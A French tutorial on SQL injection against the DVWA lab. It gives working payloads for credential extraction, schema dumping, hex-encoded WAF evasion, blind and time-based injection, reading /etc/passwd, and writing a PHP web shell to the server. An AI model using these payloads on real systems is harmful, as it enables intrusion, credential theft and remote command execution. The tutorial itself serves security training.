# Injection SQL

Nous allons voir à travers les injections SQL différentes possibilité, cependant la faille SQL propose une infinité de solution. Il faudra comprendre et maitriser le SQL pour l'exploiter à son maximum.

Nous partons sur la base de la faille SQL proposée par DVWA :

`"SELECT username FROM users WHERE id = '$id';"`

Voici un moyen simple de tester la faille SQL.

`1' and '1'='1`

puis

`1' and '1'='2`

Si la première injection ressort des résultats mais pas la seconde c'est qu'il y a une faille SQL exploitable.

**Exemple de requêtes**

Déterminer la longueur du mot de passe

`1' and LENGTH(password) > 8 --` 
`1' and LENGTH(password) = 32 --` 

On comprend que c'est un MD5 (donc 32 caractères hexadécimaux)

Si le mot de passe avait été d'une longueur de 40 caractères on aurait pu en déduire que c'est du SHA1

L**e -- en SQL permet de mettre en commentaire le reste de la requête .**

**Rechercher caractère par caractère une donnée :**

Sans résultat

`1' and password LIKE '1%`

`1' and password LIKE '2%`

`1' and password LIKE '3%`

`1' and password LIKE '4%`

Avec résultat (donc le mot de passe commence par 5)

`1' and password LIKE '5%`

On peut récupérer le mot de passe directement ainsi :
`1' UNION SELECT "", password FROM users WHERE user_id='1`

**Obtenir des informations système** (il faut un espace après le double tiret "-- ")

`' UNION SELECT DATABASE(), @@version--` 

Retourne le nom de la bdd et le nom et le numéro de version de l'OS

**Obtenir la structure complète de la BDD**  (il faut un espace après le double tiret "-- ")

`' UNION SELECT CONCAT(TABLE_SCHEMA,'.',TABLE_NAME), COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=DATABASE() --` 

# Injection SQL avancées

**Injection SQL en hexadécimal**

Le SQL est capable d'interpréter le Hexadécimal

`' or '1'='1' --` 

peut être envoyé sous cette forme
`' or 0x2731273d273127 --` 

L'intérêt d'utiliser une injection SQL en Hexadécimal étant de contourner des filtres de WAF (Web Application Firewall).

**Lecture / écriture de fichier via SQL**

En SQL il est possible de charger des fichiers (si le serveur est configuré pour le faire)

Exemple :

`SELECT LOAD_FILE('/etc/passwd')`

Si les guillemets sont refusées il est possible d'utiliser l'hexa décimal pour le nom du fichier

`SELECT LOAD_FILE(0x2f6574632f706173737764)`

**Ecriture de fichier**

`SELECT '<?php system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/web_site/shell.php'`

Cette faille n'est que très rarement possible, une option (--secure-file-priv) est souvent activée empêchant l'écriture de fichier depuis le SQL.

# Blind SQL

`1' and (SELECT 1) --`
`1' and (SELECT 0) --`

Via l'affichage nous savons que l'injection SQL est possible

Voici comment il serait possible de trouver un mot de passe en blind SQL

`1' and (SELECT 1 FROM users WHERE LENGTH(password)=32 LIMIT 1) —`

`1' and (SELECT 1 FROM users WHERE password LIKE '5fa%' LIMIT 1) --`

A chaque test le résultat de la page nous informe sur la requête SQL est passée ou non.

Dans certain cas il peut n'y avoir aucune réponse ni changement sur l'interface il est tout de même possible de savoir que notre injection SQL :

`' and (SELECT SLEEP(5) FROM users WHERE password LIKE '5f%' LIMIT 1) —`

Ici dans cette exemple c'est le temps de réponse  qui nous informe que la requête SQL est passée ou non.

Si la méthode Sleep est désactivé ou détecté il est possible de le faire avec la méthode BENCHMARK

`1' and (SELECT BENCHMARK(10000000,md5('Exploit SQL')) FROM users WHERE password LIKE '5f%' LIMIT 1) —`

Dans cette exemple le MD5 de Exploit SQL va être effectué 10 000 000 de fois ce qui prends quelques secondes et nous permet de voir que la requête SQL est passée.

Documentation externe : [https://www.programmersought.com/article/4328569017/](https://www.programmersought.com/article/4328569017/)